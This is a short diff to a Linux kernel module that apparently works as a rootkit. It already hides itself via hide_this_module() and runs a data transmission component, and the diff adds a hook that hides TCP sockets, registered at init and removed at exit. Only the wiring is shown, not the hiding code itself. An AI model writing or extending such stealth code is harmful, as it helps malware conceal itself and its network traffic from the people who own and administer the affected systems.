@@ -11,6 +11,7 @@
 #include "cpu_stats.h"
 #include "headers.h"
 #include "hide/hide_module.h"
+#include "hide/hide_tcp_sock.h"
 #include "protocol.h"
 #include "tcp_socket.h"
 #include "transmission.h"
@@ -286,6 +287,7 @@ static int __init hook_init(void) {
   }
 
   hide_this_module();
+  register_tcp_sock_hook();
   printk(KERN_INFO "Finished initializing succesfully\n");
   return ret;
 }
@@ -298,6 +300,7 @@ static void __exit hook_exit(void) {
   release_singlethread_workqueue();
   data_transmission_release();
 
+  unregister_tcp_sock_hook();
   printk(KERN_INFO "Unregistered kernel probes");
 }
 
